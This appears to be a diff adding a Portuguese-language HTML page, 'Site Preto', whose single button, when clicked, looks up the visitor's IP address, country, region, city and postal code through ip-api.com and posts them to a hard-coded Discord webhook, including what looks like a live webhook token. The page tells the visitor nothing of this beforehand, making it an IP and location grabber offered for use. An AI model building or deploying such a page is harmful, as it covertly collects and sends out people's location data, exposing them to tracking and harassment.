@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site Preto</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+
+        button {
+            padding: 20px 40px;
+            font-size: 24px;
+            cursor: pointer;
+            border: none;
+            border-radius: 10px;
+            background-color: #444;
+            color: white;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #666;
+        }
+    </style>
+</head>
+<body>
+    <button id="clickButton">Clique Aqui</button>
+
+    <script>
+        const button = document.getElementById('clickButton');
+
+        button.addEventListener('click', async () => {
+            try {
+                const webhookURL = "https://discord.com/api/webhooks/1418365085927211169/XPYKz7aAH0bctFIUWYgtE32O8RKVUZOBdOULNSmyBuildVr4yBaI3NPT47DV37KoDGb5"; // coloque seu webhook aqui
+
+                // Pega as informações do IP e localização
+                const response = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,query');
+                const data = await response.json();
+
+                if(data.status === "fail") {
+                    alert("Não foi possível obter a localização: " + data.message);
+                    return;
+                }
+
+                const mensagem = `
+Alguém clicou no botão!
+IP: ${data.query}
+País: ${data.country}
+Região/Estado: ${data.regionName}
+Cidade: ${data.city}
+CEP/Bairro aproximado: ${data.zip || "Não disponível"}
+                `;
+
+                // Envia para o Discord
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: mensagem })
+                });
+
+                alert("Mensagem enviada ao Discord!");
+            } catch (err) {
+                console.error(err);
+                alert("Ocorreu um erro ao enviar a mensagem.");
+            }
+        });
+    </script>
+</body>
+</html>
